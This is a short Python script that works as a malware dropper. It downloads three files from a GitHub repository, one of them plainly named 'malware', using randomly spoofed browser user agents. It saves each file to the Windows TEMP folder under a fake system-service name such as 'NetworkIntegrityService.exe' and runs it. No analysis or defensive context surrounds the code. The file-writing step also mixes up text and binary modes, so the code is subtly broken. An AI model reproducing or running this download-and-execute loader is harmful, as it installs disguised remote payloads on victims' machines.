import os
import time
import urllib.request
import random
import gzip
import subprocess
from io import BytesIO

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

def fetch_url_with_random_user_agent(url):
    user_agent = random.choice(user_agents)
    
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    req = urllib.request.Request(url, headers=headers)
    try:
        response = urllib.request.urlopen(req)
        if 'gzip' in response.headers.get('Content-Encoding', ''):
            buf = BytesIO(response.read())
            f = gzip.GzipFile(fileobj=buf)
            return f.read().decode('utf-8')
        else:
            return response.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        print(f"HTTP Error: {e.code} - {e.reason}")
        return None
    except Exception as e:
        print(f"Error: {str(e)}")
        return None

def write_and_execute(url, file_name):
    raw_code = fetch_url_with_random_user_agent(url)
    if raw_code:
        temp_dir = os.getenv('TEMP')
        file_path = os.path.join(temp_dir, file_name)

        with open(file_path, 'wb') as f:
            f.write(raw_code)
        
        print(f"Raw code written to {file_path}")
        
        subprocess.run([file_path], check=True)
    else:
        print(f"Failed to fetch or write code for {file_name}")

url1 = 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware'
url2 = 'https://github.com/247msn/96737693845/raw/refs/heads/main/watchdog1'
url3 = 'https://github.com/247msn/96737693845/raw/refs/heads/main/watchdog2'

# Execute in order
write_and_execute(url1, 'NetworkIntegrityService.exe')
write_and_execute(url2, 'SystemResourceMonitor.exe')
write_and_execute(url3, 'SecurityHealthCheck.exe')
